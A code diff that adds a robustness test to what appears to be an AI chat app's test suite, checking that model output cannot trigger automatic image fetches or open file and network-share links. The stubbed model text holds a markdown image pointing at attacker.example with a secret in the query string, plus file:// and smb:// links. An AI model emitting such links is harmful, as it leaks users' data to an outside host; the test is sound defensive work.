@@ -84,6 +84,20 @@ export const robustnessScenarios = [
 		},
 	},
 	{
+		name: 'robustness: text from a model cannot make the app fetch an image or open a dangerous link by itself',
+		fn: async (t) => {
+			t.use(() => ({ text: 'Result: ![chart](https://attacker.example/leak?d=SECRET-FROM-A-FILE) see [calculator](file:///C:/Windows/System32/calc.exe), [share](smb://attacker/share), [docs](https://example.com/docs) and ![inline](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==)' }));
+			await t.send('show me the result');
+			t.check('the run ends', await t.idle());
+			await t.sleep(500);
+			t.check('the answer is shown', (await t.ui.assistantTexts(t.page)).some(x => x.includes('Result:')));
+			t.check('no <img> points at a web address (it would be fetched without a click)', (await t.page.locator('img[src*="attacker.example"]').count()) === 0);
+			t.check('no link opens a file or a network share', (await t.page.locator('a[href^="file:"], a[href^="smb:"]').count()) === 0);
+			t.check('a normal https link is still a link', (await t.page.locator('a[href="https://example.com/docs"]').count()) > 0);
+			t.check('an image that carries its own bytes is still drawn', (await t.page.locator('img[src^="data:image/png;base64,"]').count()) > 0);
+		},
+	},
+	{
 		name: 'robustness: a 30 MB file read does not flood the model, the app or the run',
 		timeout: 180_000,
 		fn: async (t) => {
